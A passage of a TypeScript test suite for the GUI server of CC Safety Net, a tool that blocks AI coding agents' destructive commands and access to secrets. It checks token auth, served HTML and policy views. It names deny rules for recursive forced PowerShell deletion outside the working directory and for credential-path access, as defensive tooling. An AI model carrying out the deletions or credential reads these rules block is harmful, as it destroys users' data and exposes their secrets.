import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, join } from 'node:path';
import { runPolicyCommand } from '@/cli/policy';
import { REASON_POLICY_CONFIG_PROTECTION } from '@/guards/policy-protection';
import {
  createPolicyGuiServer,
  fetchHealth,
  fetchIntegrations,
  fetchStarContext,
  runGuiCommand,
  runIntegration,
  starRepo,
  userHasStarredRepo,
} from '@/gui';
import type { ChooseDirectoryResult } from '@/gui/choose-directory';
import { doctorIntegrationOrder, getIntegrationDisplayName } from '@/integrations/catalog';
import type { InstallAction, InstallTarget } from '@/integrations/install/targets';
import { getPackageVersion } from '@/integrations/system-info';
import { getUserPolicyPath, loadPolicyConfig } from '@/policy/store';
import { captureConsoleOutput, mockVersionFetcher, withEnv, writeJsonlFixture } from '../helpers';
import { syncInitialGitRulebook } from '../helpers/rulebook';
import { writeFakeCommands } from '../integrations/install/install-test-helpers';

interface PolicyApiResponse {
  exists: boolean;
  raw: string;
  errors: string[];
  configState: { state: string; reason?: string };
  policy: {
    version: number;
  };
  destructiveCommandRules: unknown[];
  secretPatterns: unknown[];
  version: string;
  preview: {
    selectedPreset: string;
    counts: { enabled: number };
  } | null;
}

interface WriteApiResponse {
  errors: string[];
}

interface StarContextApiResponse {
  starred: boolean | null;
  starCount: number | null;
  blockedTotal: number;
}

interface ActivityApiResponse {
  days: number;
  logsDir: string | null;
  totalInWindow: number;
  truncated: boolean;
  counts: {
    blocked: number;
    allowed: number;
    agents: Record<string, number>;
    blockedByDay: number[];
    analyzedByDay: number[];
    rules: Record<string, number>;
    commands: Record<string, number>;
    errors: number;
  };
  entries: { ts: string; command: string; decision?: string }[];
}

interface IntegrationsApiResponse {
  targets: {
    target: string;
    label: string;
    version: string | null;
    status: 'active' | 'disabled' | 'not-installed';
  }[];
  system: { version: string; nodeVersion: string | null; platform: string };
}

interface IntegrationActionApiResponse {
  ok: boolean;
  output: string;
}

interface ProjectDraftApiResponse {
  dir: string;
  path: string;
  revision: number;
  baseline: { safety: { level: string }; audit: { retention_days: number } };
  userPolicyDiagnostics: string[];
  projection: Record<string, unknown>;
  projectionDiagnostics: string[];
  canPickDirectory: boolean;
}

interface ProjectDiffApiResponse {
  rows: { field: string; before?: string; after?: string }[];
  weakenings: string[];
  existingFileDiagnostics: string[];
  errors: string[];
}

interface ProjectApplyApiResponse {
  path: string;
  errors: string[];
}

interface RulesApiResponse {
  projectPath: string;
  canPickDirectory: boolean;
  rulebooks: {
    source: 'user' | 'project';
    spec: string;
    name: string;
    version: string;
    rules: {
      name: string;
      command: string;
      subcommand?: string;
      block_args: string[];
      reason: string;
    }[];
  }[];
  errors: string[];
  warnings: string[];
}

const DEFAULT_POLICY_BODY = {
  version: 1,
  safety: { level: 'standard', overrides: {} },
  workflow: { worktree_mode: false },
  destructive_command_protection: { enabled: true, overrides: {} },
  secret_protection: { enabled: true, overrides: {}, deny_paths: [] },
};

const PROJECT_RULE = {
  name: 'project-rules/block-git-add-all',
  command: 'git',
  subcommand: 'add',
  block_args: ['-A'],
  reason: 'Stage specific files.',
};

const PROJECT_RULEBOOK = {
  source: 'project' as const,
  spec: 'project-rules',
  name: 'project-rules',
  version: '1.0.0',
  rules: [PROJECT_RULE],
};

const policyWithToggle = (toggle: 'on' | 'off' | 'maybe') => ({
  ...DEFAULT_POLICY_BODY,
  destructive_command_protection: {
    enabled: true,
    overrides: { 'powershell.remove-item-recursive-force-outside-cwd': toggle },
  },
});

const writeClaudePluginState = (homeDir: string, enabled: boolean) => {
  const claudeDir = join(homeDir, '.claude');
  mkdirSync(join(claudeDir, 'plugins'), { recursive: true });
  writeFileSync(
    join(claudeDir, 'plugins', 'installed_plugins.json'),
    JSON.stringify({ plugins: { 'cc-safety-net@cc-marketplace': [{ scope: 'user' }] } }),
  );
  const enabledPlugins = { 'cc-safety-net@cc-marketplace': enabled };
  writeFileSync(join(claudeDir, 'settings.json'), JSON.stringify({ enabledPlugins }));
};

describe('policy GUI server', () => {
  let tempDir: string;
  let safetyNetHome: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'safety-net-gui-'));
    safetyNetHome = join(tempDir, '.cc-safety-net');
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  // The server resolves retention from the policy file beside the rules dir it
  // was given, so this is what a configured window looks like on disk.
  const writeRetentionPolicy = (retentionDays: number) => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(
      join(safetyNetHome, 'policy.json'),
      JSON.stringify({ version: 1, audit: { retention_days: retentionDays } }),
      'utf-8',
    );
  };

  const writeActivityLog = (
    entries: readonly Record<string, unknown>[],
    filename = 'feed.jsonl',
  ) => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    const logFile = join(logsDir, filename);
    writeJsonlFixture(logFile, entries);
    return { logFile, logsDir };
  };

  const withActivityServer = async <T>(
    logsDir: string,
    run: (server: Awaited<ReturnType<typeof createPolicyGuiServer>>) => Promise<T>,
  ) => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      activityLogsDir: logsDir,
    });
    try {
      return await run(server);
    } finally {
      await server.close();
    }
  };

  const createInstallApiServer = (
    runIntegrationHandler: (
      action: InstallAction,
      target: InstallTarget,
    ) => Promise<{ ok: boolean; output: string }>,
  ) =>
    createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: runIntegrationHandler,
    });

  test('binds localhost and rejects missing or wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(server.url.startsWith('http://127.0.0.1:')).toBe(true);
      expect(server.url).toContain(`token=${server.token}`);

      expect((await fetch(`${server.origin}/api/policy`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/policy?token=wrong`)).status).toBe(403);
      expect((await fetch(`${server.origin}/favicon.ico`)).status).toBe(204);
      expect((await fetch(server.url)).headers.get('cache-control')).toBe('no-store');
    } finally {
      await server.close();
    }
  });

  test('GET root serves the GUI document with bundled custom CSS and token bootstrap', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(server.url);
      const html = await response.text();

      expect(response.headers.get('content-type')).toBe('text/html; charset=utf-8');
      expect(html).toContain('<title>CC Safety Net</title>');
      // The token is the whole request-time surface: a JSON data tag the page
      // script reads, rather than a value spliced into the script source.
      expect(html).toContain(
        `<script id="ccsn-data" type="application/json">{"token":"${server.token}"}</script>`,
      );
      expect(html).toContain(
        'var token = JSON.parse(document.getElementById("ccsn-data").textContent).token;',
      );
      expect(html).toContain('cc-safety-net-gui-custom-css');
      expect(html).toContain('role="status"');
      expect(html).toContain('aria-live="polite"');
      expect(html).toContain('id="app-status"');
      expect(html).toContain('id="protection-banner"');
      // Sidebar shell with hash-routed views; the global status bar sits in the topbar.
      expect(html).toContain('<aside class="sidebar">');
      expect(html).toContain('<nav class="sidenav" aria-label="Sections">');
      expect(html).toContain('data-nav="overview"');
      expect(html).toContain('data-nav="activity"');
      expect(html).toContain('data-nav="policy"');
      expect(html).toContain('data-nav="rules"');
      expect(html).toContain('data-nav="integrations"');
      expect(html).toContain('data-nav="settings"');
      expect(html).toContain('<link rel="icon" href="data:image/svg+xml,');
      expect(html).toContain('title="Overview"');
      expect(html).toContain('title="Activity"');
      expect(html).toContain('title="Policy"');
      expect(html).toContain('title="Rules"');
      expect(html).toContain('title="Settings"');
      expect(html).toContain('.sr-only-collapse');
      expect(html).toContain('@media (max-width: 900px)');
      expect(html).toContain('repeat(2, minmax(0, 1fr))');
      expect(html).toContain('<section class="view" data-view="overview">');
      expect(html).toContain('<section class="view" data-view="activity" hidden>');
      expect(html).toContain('<section class="view" data-view="policy" hidden>');
      expect(html).toContain('<section class="view" data-view="rules" hidden>');
      expect(html).toContain('<section class="view" data-view="integrations" hidden>');
      expect(html).toContain('<section class="view" data-view="settings" hidden>');
      expect(html).toContain(
        'var viewNames = ["overview", "activity", "policy", "rules", "integrations", "settings"];',
      );
      expect(html).toContain('requestJson("/api/integrations")');
      expect(html).toContain('window.addEventListener("hashchange", applyView);');
      expect(html).toContain('<header class="topbar" id="topbar">');
      expect(html.indexOf('id="policy-savebar"')).toBeLessThan(html.indexOf('id="save"'));
      expect(html.indexOf('id="save"')).toBeLessThan(html.indexOf('id="reset"'));
      expect(html).toContain('.topbar {\n  position: sticky;');
      // Topbar merges the view title, status chip, and Save; title tracks the route.
      expect(html).toContain('id="topbar-title"');
      expect(html).toContain('var viewTitles = {');
      expect(html).toContain('.topbar-row {');
      expect(html).toContain('document.title = `${viewTitles[view]} · CC Safety Net`;');
      // A fallback runtime configuration is stated on every view through the
      // existing alert banner, carrying the snapshot reason verbatim.
      expect(html).toContain(
        'if (!configState || configState.state === "ready")\n    return null;',
      );
      expect(html).toContain(
        'return `A fallback configuration is being enforced: ${configState.reason}`;',
      );
      expect(html).toContain('setProtectionBanner([configNotice]);');
      // Overview: stat tiles plus posture cards backed by /api/policy and /api/activity.
      expect(html).toContain('id="overview-tiles"');
      // Overview owns a fixed window so the Activity window selector cannot
      // rewrite its tiles, sparkline, and top lists.
      expect(html).toContain('requestJson(`/api/activity?days=${overviewDays()}`)');
      // Both tiles measure the guard over one window, stated once in the caption
      // so each label stays a single word and neither restates the other.
      expect(html).toContain('id="overview-window"');
      expect(html).toContain('`Last ${dayCount(overview.days)}`');
      // Retention goes down to 1, so day counts are rendered through one helper
      // rather than hardcoding the plural at each label.
      expect(html).toContain('var dayCount = (days) => `${days} day${days === 1 ? "" : "s"}`;');
      expect(html).toContain(
        'tile(overview.counts.blocked, "Blocked", sparkline(overview.counts.blockedByDay, "blocked"))',
      );
      expect(html).toContain(
        'tile(overview.totalInWindow, "Analyzed", sparkline(overview.counts.analyzedByDay, "analyzed"))',
      );
      // Overview health strip loads asynchronously after first render via GET /api/health.
      expect(html).toContain('id="health-strip"');
      expect(html).toContain('requestJson("/api/health")');
      // Part 2 replaced the recent-blocks feed with posture + pattern cards.
      expect(html).not.toContain('id="recent-blocks"');
      expect(html).not.toContain('id="view-all-blocks"');
      expect(html).toContain('id="protection-card"');
      expect(html).toContain('var renderProtectionCard = () => {');
      expect(html).toContain('.protection-warning {');
      expect(html).toContain('Destructive command protection is OFF');
      expect(html).toContain('Secret protection is OFF');
      expect(html).toContain('id="top-rules"');
      expect(html).toContain('id="top-commands"');
      // Activity <-> Policy cross-links reuse the rule-id chip as a button in both directions.
      expect(html).toContain('data-rule-activity=');
      expect(html).toContain('data-jump-rule');
      expect(html).toContain('var jumpToActivityRule');
      // Top command drill-down filters the feed by exact signature, blocked-only,
      // so the feed count reconciles with the Top blocked commands tally.
      expect(html).toContain(
        'return commandSignature(entry.segment || entry.command) === activityFilters.command;',
      );
      expect(html).toContain('No blocked commands in this window.');
      expect(html).toContain('id="guard-errors"');
      expect(html).toContain('[chipHtml("decision", "error", "Errors", activity.counts.errors)]');
      expect(html).toContain(
        'if (activityFilters.decision === "error" && !entry.failureStage)\n      return false;',
      );
      expect(html).toContain(
        'if (activityFilters.decision === "error" && activity.counts.errors === 0) {',
      );
      // Activity: filterable audit feed.
      expect(html).toContain('id="activity-days"');
      // Windows cannot exceed retained history, and no count may claim more
      // than the window it was measured over. The options are built from the
      // configured retention rather than hardcoded, so a shortened retention
      // cannot leave an option the server would reject.
      expect(html).toContain(
        'const windows = [7, 30, 90, 180, 365].filter((days) => days < retained);',
      );
      expect(html).toContain('return [...windows, retained];');
      expect(html).not.toContain('Last year');
      expect(html).not.toContain('reviewed');
      expect(html).not.toContain('all time');
      expect(html).toContain('id="activity-refresh"');
      expect(html).toContain('id="activity-search"');
      expect(html).toContain('id="activity-decision"');
      expect(html).toContain('id="activity-agents"');
      // Command drill-down from the overview shows as a removable pill, not search text.
      expect(html).toContain('id="activity-command-filter"');
      expect(html).toContain('data-clear-command');
      // Feed rows lead with the offending segment (fallback to the raw command).
      expect(html).toContain('entry.segment || entry.command || "(no command recorded)"');
      // False-positive reporting stays blocked-entry-only and prefills nothing
      // but the selected entry.
      expect(html).toContain(
        '${deny ? `<button type="button" class="icon-button feed-report" data-report-fp="${index}"',
      );
      expect(html).toContain('const entry = renderedFeedEntries[Number(button.dataset.reportFp)];');
      expect(html).toContain('placeholder="Filter by rule or command"');
      expect(html).toContain('id="activity-feed"');
      expect(html).toContain('id="activity-count"');
      expect(html).toContain('requestJson(`/api/activity?days=${activityFilters.days}`)');
      expect(html).toContain('var feedItemHtml = (entry, index) => {');
      // Per-entry copy-as-JSON button, matching the raw JSON copy control.
      expect(html).toContain('class="icon-button feed-copy" data-log-copy=');
      expect(html).toContain('JSON.stringify(entry, null, 2)');
      expect(html).toContain(
        'var activityFilters = { days: 7, decision: "all", agent: "all", query: "", command: "" };',
      );
      expect(html).toContain('data-activity-chip=');
      // Error badge for fail-closed guard failures (amber, still a deny).
      expect(html).toContain('--warn-fg:');
      expect(html).toContain('.decision-badge.error {');
      expect(html).toContain(
        'const badgeClass = entry.failureStage ? "error" : deny ? "deny" : "allow";',
      );
      // Agent display names; the badge renders only for identified agents.
      // Every audit `agent` value is an integration id, so a hand-kept subset
      // would silently render raw ids for whatever it missed. The labels are
      // bundled from the integration catalog now, so evaluate that block of the
      // built script instead of matching the bundler's layout.
      const bundledLabels = new Function(
        `${html.slice(
          html.indexOf('var catalog = ['),
          html.indexOf('// src/gui/frontend/main.ts'),
        )}return integrationDisplayNames;`,
      )() as Record<string, string>;
      for (const id of doctorIntegrationOrder) {
        expect(bundledLabels[id]).toBe(getIntegrationDisplayName(id));
      }
      expect(html).toContain('entry.agent && entry.agent !== "unknown"');
      // Unattributed logs get no chip; they fall under the "All agents" view.
      expect(html).toContain('.filter((name) => name !== "unknown")');
      expect(html).toContain('data-chip-value=');
      // Search matches only what the row shows: the rule id and the displayed
      // command (segment, falling back to the raw command). Reason/cwd/agent are
      // excluded so a hit is always visible in the row.
      expect(html).toContain('return [entry.ruleId, entry.segment || entry.command]');
      // Clamp toggle for long feed commands.
      expect(html).toContain('max-height: 7.2em');
      expect(html).toContain('data-feed-toggle');
      expect(html).toContain('Show more');
      expect(html).toContain('.feed-command.expanded {');
      // Day separators in the Activity feed.
      expect(html).toContain('.feed-day-sep {');
      expect(html).toContain('var dayLabel = (ts) => {');
      // Per-day sparklines built from server counts only.
      expect(html).toContain('const sparkline = (byDay, noun) => {');
      expect(html).toContain('Commands ${noun} per day, most recent');
      expect(html).toContain(
        '<div class="spark-bar${count === 0 ? " spark-zero" : ""}" aria-hidden="true"',
      );
      // Settings: file locations, raw JSON, and the danger zone with reset.
      expect(html).toContain('id="logs-path"');
      expect(html).toContain('id="policy-path"');
      expect(html).toContain('<h2>Danger zone</h2>');
      expect(html.indexOf('id="theme-toggle"')).toBeGreaterThan(
        html.indexOf('data-view="settings"'),
      );
      // Part 1: quiet topbar + four-layer unsaved-changes protection stack.
      expect(html).not.toContain('Unsaved changes. Click Save to apply.');
      expect(html).toContain('id="discard-changes"');
      expect(html).toContain('Discard unsaved changes?');
      expect(html).toContain('Changes discarded.');
      expect(html).not.toContain('.app-status .discard-link {');
      expect(html).toContain('No changes to save');
      expect(html).toContain('var dirty = false;');
      expect(html).toContain('var updateDirtyStatus = () => {');
      expect(html).toContain('dirty = draftJson !== JSON.stringify(state.policy);');
      expect(html).toContain('qs("policy-savebar").hidden = !dirty;');
      expect(html).toContain(
        '<div class="policy-savebar" id="policy-savebar" hidden><span>Unsaved changes</span><div class="savebar-actions"><button type="button" id="discard-changes">Discard</button><button class="primary" id="save">Save</button></div></div>',
      );
      expect(html).toContain('id="dirty-chip"');
      expect(html).toContain('Unsaved policy changes · Review');
      expect(html).toContain('.app-status:empty {');
      expect(html).toContain('--topbar-h');
      expect(html).toContain('.policy-savebar {');
      expect(html).toContain('window.addEventListener("beforeunload"');
      expect(html).toContain('cc-safety-net-draft');
      expect(html).toContain('Restored unsaved draft');
      // The restore path dereferences these nested draft fields, so a damaged
      // or stale draft must fail this validation and be discarded instead of
      // crashing rendering after a successful policy load.
      expect(html).toContain('Object.hasOwn(safetyLevels, parsed.safety.level)');
      expect(html).toContain('isRecordField(parsed.safety.overrides)');
      expect(html).toContain('isRecordField(parsed.destructive_command_protection.overrides)');
      expect(html).toContain('isRecordField(parsed.secret_protection.overrides)');
      expect(html).toContain(
        'isOptionalPathList(parsed.destructive_command_protection.allow_paths)',
      );
      expect(html).toContain('isOptionalPathList(parsed.secret_protection.deny_paths)');
      expect(html).toContain('isOptionalPathList(parsed.secret_protection.allow_paths)');
      // A retention change writes only the saved policy, so its reload must
      // restore the session draft instead of discarding it like a policy write.
      expect(html).toContain(
        'if (!await load())\n      return;\n    activityFilters.days = Math.min(activityFilters.days, days);',
      );
      expect(html).toContain('setAppStatus("Repair required", "error");');
      expect(html).toContain('setAppStatus("");');
      expect(html).toContain('setDetailStatus(');
      expect(html).toContain('Destructive Command Protection');
      expect(html).toContain('Safety preset');
      // The project policy is reported beside the file rows and never edited here.
      expect(html).toContain('id="project-policy-path"');
      expect(html).toContain('id="project-policy-notice"');
      // Preset status dedupe: text only when customized, hidden when empty.
      expect(html).toContain('#safety-preset-status:empty');
      expect(html).toContain(
        'qs("safety-preset-status").textContent = customized ? `${presetName()} · Customized` : "";',
      );
      expect(html).toContain('Available in every preset');
      expect(html).toContain('Strict tier');
      expect(html).toContain('Paranoid tier');
      expect(html).toContain('Use inherited setting');
      expect(html).toContain(
        '${override && !effective.changesInherited ? `<button type="button" class="inherit-button"',
      );
      // Reset button lives at the far right of the panel head, not inside the rules body.
      expect(html).toContain(
        '<button type="button" id="reset-rule-customizations" class="panel-head-action">Restore defaults</button>',
      );
      expect(html).toContain(
        '<button type="button" id="reset-secret-customizations" class="panel-head-action">Restore defaults</button>',
      );
      expect(html).not.toContain('rule-customization-actions');
      expect(html.indexOf('id="reset-rule-customizations"')).toBeLessThan(
        html.indexOf('<div id="destructive-command">'),
      );
      expect(html).toContain('id="rule-example-popover"');
      expect(html).toContain('popover="auto"');
      expect(html).toContain('role="dialog"');
      expect(html).toContain('id="rule-example-title"');
      expect(html).toContain('id="rule-example-command"');
      expect(html).toContain('data-rule-example=');
      expect(html).toContain('Show blocked example for');
      expect(html).toContain('var openRuleExample = ');
      expect(html).toContain(
        'showRulePopover(button, "Blocked command example", rule.label, rule.example);',
      );
      // The brand logo is a link home, so it uses the same hash routing as the sidenav.
      expect(html).toContain('<h1 class="brand-logo"><a class="brand-home" href="#overview"');
      // The Settings tab states which cc-safety-net version is serving the page.
      expect(html).toContain('id="app-version"');
      expect(html).toContain('qs("app-version").textContent = state.version');
      expect(html).toContain('data-secret-paths=');
      expect(html).toContain('Show protected paths for');
      // The bundler prints the '\n' separator as a template literal holding one
      // real newline, so the call spans two lines in the served script.
      expect(html).toContain(
        'showRulePopover(button, "Protected paths", rule.label, rule.paths.join(`\n`));',
      );
      expect(html).toContain('popover.showPopover();');
      expect(html).toContain('.rule-example-button {');
      expect(html).toContain('.rule-example-popover {');
      expect(html).toContain('requestJson("/api/policy/preview"');
      expect(html).toContain('id="tester-input"');
      expect(html).toContain('requestJson("/api/policy/explain"');
      expect(html).toContain('var previewRequestId = 0;');
      expect(html).toContain('const requestId = ++previewRequestId;');
      expect(html).toContain('if (requestId !== previewRequestId)\n    return false;');
      // A rule matching what it inherits keeps no override in user mode; project
      // mode always writes it out (tests/gui/project-draft.test.ts drives both).
      expect(html).toContain(
        'if (!projectDraft && active === inheritedEnabled) {\n    delete draftPolicy.destructive_command_protection.overrides[ruleId];',
      );
      expect(html).toContain(
        'setDestructiveOverride(ruleId, input.checked, preview?.rules[ruleId]?.inheritedEnabled);',
      );
      expect(html).toContain('var tierExpanded = new Map([');
      expect(html).toContain('["strict", false]');
      expect(html).not.toContain('["strict", true]');
      expect(html).toContain('var searchCollapsedTiers = new Set;');
      expect(html).toContain(
        'if (searchActive && expanded)\n      searchCollapsedTiers.add(tier);',
      );
      expect(html).toContain('Destructive command protection');
      expect(html).toContain('Catastrophic and custom rules remain active when disabled.');
      // Catastrophic rules render in a read-only, collapsible "Always enforced" group, not as (locked) toggles.
      expect(html).toContain('rule-tier-enforced');
      expect(html).toContain('>Always enforced<');
      expect(html).toContain('data-tier-toggle="enforced"');
      expect(html).toContain('["enforced", false]');
      expect(html).toContain(
        'const enforcedRules = matchingRules.filter((rule) => rule.catastrophic);',
      );
      expect(html).toContain(
        'const configurableRules = matchingRules.filter((rule) => !rule.catastrophic);',
      );
      expect(html).not.toContain('effective.source === "catastrophic" ||');
      expect(html).not.toContain('catastrophic protection cannot be disabled');
      expect(html).not.toContain('secret protection unchanged');
      expect(html).toContain('data-destructive-command-enabled');
      expect(html).toContain('id="policy-search"');
      expect(html).toContain('Search all protections');
      expect(html.indexOf('id="policy-search"')).toBeLessThan(html.indexOf('id="reset"'));
      expect(html).toContain('flex: 1 1 240px;');
      expect(html).toContain('max-width: none;');
      // Search lives in the top bar, contextual per view, sticky on mobile.
      expect(html).toContain('class="view-search topbar-search" data-search-view="activity"');
      expect(html).toContain('class="view-search topbar-search" data-search-view="policy"');
      expect(html).toContain('.topbar.has-search {');
      expect(html).toContain('qs("topbar").classList.toggle("has-search", hasSearch)');
      expect(html).not.toContain('appbar');
      expect(html).not.toContain('id="destructive-command-search"');
      expect(html).not.toContain('id="secret-search"');
      expect(html).not.toContain('Search protections');
      expect(html).toContain('#destructive-command > label.row');
      expect(html).toContain('margin-bottom: 16px');
      expect(html).not.toContain(
        'label.row:has(input:checked) {\n  border-color: color-mix(in srgb, var(--accent)',
      );
      expect(html).not.toContain('class="panel foldable"');
      expect(html).not.toContain('destructive-command-panel-content');
      expect(html).toContain('<h2>Destructive Command Protection</h2>');
      expect(html).toContain('<h2>Secret Protection</h2>');
      expect(html).toContain('aria-controls="safety-overrides-content"');
      expect(html).toContain('id="safety-overrides-content" hidden');
      expect(html).toContain('<label class="row safety-override-row">');
      expect(html).toContain('label.row.safety-override-row {\n  display: grid;');
      expect(html).toContain('label.row.safety-override-row select {');
      expect(html).toContain('width: 100%;');
      expect(html).toContain('.panel-toggle {\n  display: inline-flex;');
      expect(html).toContain('font-size: inherit;\n  font-weight: inherit;');
      expect(html).not.toContain('.foldable > .panel-head {');
      expect(html).toContain('data-secret-group-toggle=');
      expect(html).not.toContain('tier-toggle"');
      expect(html).toContain('class="tier-collapse" data-tier-toggle=');
      expect(html).toContain('class="tier-collapse" data-secret-group-toggle=');
      // The group switch uses a thin track and an oversized knob, so it does not
      // read as a peer of the rule switches it governs.
      expect(html).toContain('class="tier-switch" data-secret-group-active=');
      expect(html).toContain('if (input.dataset?.secretGroupActive) {');
      // The configurable destructive tiers carry the same switch; the enforced
      // tier cannot, because no override can turn its rules off.
      expect(html).toContain('class="tier-switch" data-destructive-tier-active=');
      expect(html).toContain('if (input.dataset?.destructiveTierActive) {');
      expect(html).not.toContain('data-destructive-tier-active="enforced"');
      expect(html).not.toContain('Turn all off');
      expect(html).toContain('.tier-switch::before {');
      expect(html).toContain('.tier-switch::after {');
      expect(html).toContain('.tier-collapse {');
      expect(html).toContain(':is(.rule-tier-head, .tier-collapse)[aria-expanded="false"]');
      expect(html).toContain('.rule-tier-head:hover:not(:disabled)');
      // Tier counts trim zero segments and color off. A customized count is not
      // among them: it overlays on/off rather than partitioning with them, so it
      // reads as a third state. The panel head and each rule row still say it.
      expect(html).toContain('var tierCountHtml = (segments) => {');
      expect(html).toContain('[allGroupRules.length - onCount, ');
      expect(html).toContain('.tier-counts .count-off {');
      expect(html).not.toContain('count-customized');
      expect(html).not.toContain('"customized", "customized"');
      expect(html).toContain('var secretGroupExpanded = new Map;');
      expect(html).toContain('var searchCollapsedSecretGroups = new Set;');
      expect(html).toContain('Active');
      expect(html).toContain('Disabled');
      expect(html).not.toContain('Paused');
      expect(html).not.toContain('state-paused');
      expect(html).toContain('<dialog class="confirm-dialog" id="confirm-dialog"');
      expect(html).toContain('id="confirm-dialog-title"');
      expect(html).toContain('id="confirm-dialog-confirm"');
      expect(html).toContain('var confirmDialog =');
      expect(html).toContain('showModal()');
      expect(html).toContain('const detailRow = qs("confirm-dialog-detail").parentElement;');
      expect(html).toContain('detailRow.hidden = !options.detail;');
      expect(html).toContain('var confirmProtectionDisable =');
      expect(html).toContain('Disable destructive command protection?');
      expect(html).toContain('Custom rules remain active.');
      expect(html).toContain(
        'Configurable protection disabled. Catastrophic protections remain active; saved rule settings and allow paths are preserved.',
      );
      expect(html).toContain('id="allow-paths-input"');
      expect(html).toContain('id="allow-paths-list"');
      expect(html).toContain('data-path-add="allow-paths"');
      expect(html).toContain(
        '`${preview.counts.enabled} active, ${preview.counts.disabled} disabled`',
      );
      expect(html).not.toContain('require Strict ·');
      expect(html).not.toContain('require Paranoid ·');
      expect(html).not.toContain('user-disabled`');
      expect(html).toContain('Disable secret protection?');
      expect(html).toContain(
        'Default sensitive paths, coding CLI credential locations, and deny paths will stop blocking access until you turn this back on.',
      );
      expect(html).not.toContain('Configured deny paths are part of Secret protection.');
      expect(html).toContain('input.checked = true;');
      expect(html).toContain('confirmLabel: "Reset policy"');
      expect(html).not.toContain('Confirm reset');
      expect(html).not.toContain('Search secret patterns');
      expect(html).toContain('Default sensitive paths');
      expect(html).toContain(
        'Block default sensitive paths, coding CLI credential locations, and configured deny paths.',
      );
      expect(html).not.toContain(
        'Block default sensitive path patterns and configured deny paths.',
      );
      expect(html).toContain(
        'Configured paths and everything inside them are blocked while Secret protection is on.',
      );
      expect(html).not.toContain('blocks nearly every command the agent runs');
      expect(html).toContain('deny_paths: paths');
      expect(html).not.toContain('Deny paths remain active');
      expect(html).not.toContain('Deny paths are always blocked');
      expect(html).not.toContain('trusted user policy');
      expect(html).toContain('const disabled = !draftPolicy.secret_protection.enabled;');
      expect(html).not.toContain('qs("deny-paths")');
      expect(html).not.toContain('One path per line');
      expect(html).toContain('id="deny-paths-input"');
      expect(html).toContain('id="deny-paths-add-button"');
      expect(html).toContain('id="deny-paths-list"');
      expect(html).toContain('id="deny-paths-hint"');
      expect(html).toContain('var createPathList = ');
      expect(html).toContain('var pathLists = {');
      expect(html).toContain('data-path-remove');
      expect(html).toContain('No ${config.itemLabel}s configured.');
      expect(html).toContain('id="deny-paths-count"');
      expect(html).toContain('`${paths.length} path${paths.length === 1 ? "" : "s"}`');
      expect(html).toContain('Already listed:');
      expect(html).toContain('Remove ${config.itemLabel} ${escapeHtml(path)}');
      expect(html).toContain('var pathListIcons =');
      expect(html).toContain('aria-label="Add deny path"');
      expect(html).toContain('aria-label="Add allow path"');
      expect(html).toContain('Recursive deletes targeting these paths are not blocked, like /tmp.');
      expect(html).toContain('validateAdditions: (paths) => validatePathAdditions(');
      expect(html).not.toContain('>Add</button>');
      expect(html).not.toContain('>Remove</button>');
      expect(html).toContain('event.clipboardData');
      expect(html).toContain('deny_paths: draftPolicy.secret_protection.deny_paths');
      expect(html).not.toContain('updateDraftSecretPaths');
      expect(html).not.toContain('textarea:disabled:hover');
      expect(html).toContain('cursor: not-allowed');
      expect(html).toContain('if (input.id === "policy-search") {');
      expect(html).not.toContain('searchPanelIds');
      expect(html).toContain('var searchActive = false;');
      expect(html).not.toContain('searchExpandedPanels');
      expect(html).toContain('var syncSearchState = () => {');
      expect(html).toContain('if (active === searchActive)\n    return;');
      expect(html).toContain('searchCollapsedSecretGroups.clear();');
      expect(html).toContain(
        'if (searchActive && expanded)\n      searchCollapsedSecretGroups.add(category);',
      );
      expect(html).toContain('renderDestructiveCommands();');
      expect(html).toContain('renderSecretPatterns();');
      expect(html).toContain(
        '<strong>${escapeHtml(rule.label)}</strong>\n              <button type="button" class="rule-id" data-rule-activity="${escapeHtml(rule.id)}" title="Show recent blocks in Activity">${escapeHtml(rule.id)}</button>',
      );
      expect(html).not.toContain(
        '<strong>${escapeHtml(rule.label)}</strong> <button type="button" class="rule-id" data-rule-activity="${escapeHtml(rule.id)}"',
      );
      expect(html).toContain(':is(label.row, .rule-control) .rule-id {');
      expect(html).toContain('display: block;');
      expect(html).toContain('font-family: var(--font-mono);');
      expect(html).toContain('word-break: break-all;');
      expect(html).toContain('syncRawFromForm();');
      expect(html).not.toContain('secret-panel-content');
      expect(html).toContain('aria-expanded="false" aria-controls="deny-paths-content"');
      expect(html).toContain('id="deny-paths-content" hidden');
      expect(html).toContain('aria-expanded="false" aria-controls="allow-paths-content"');
      expect(html).toContain('id="allow-paths-content" hidden');
      expect(html).toContain('Policy JSON');
      expect(html).toContain(
        '<div class="panel-head raw-json-head">\n              <div class="panel-title">\n                <h2>Policy JSON</h2>',
      );
      // The panel lives in the Policy tab, where project draft mode previews the
      // sparse proposal beside the controls that produced it.
      expect(html.indexOf('<h2>Policy JSON</h2>')).toBeGreaterThan(
        html.indexOf('data-view="policy"'),
      );
      expect(html.indexOf('<h2>Policy JSON</h2>')).toBeLessThan(
        html.indexOf('data-view="settings"'),
      );
      expect(html).toContain('.raw-json-head {\n  flex-wrap: nowrap;');
      expect(html).toContain('.raw-json-head .panel-title {');
      expect(html).toContain('.raw-json-head #raw-copy {');
      // raw-json-head and the Configure link's head stay row on mobile.
      expect(html).toContain('.panel-head:has(.view-all-link) {');
      expect(html).toContain('flex-direction: row;');
      expect(html).toContain('id="raw-copy"');
      expect(html).toContain('aria-label="Copy raw JSON to clipboard"');
      expect(html).toContain('id="repair"');
      expect(html).toContain('>Repair</button>');
      expect(html).toContain('readonly></textarea>');
      expect(html).toContain('Read-only mirror of the policy controls.');
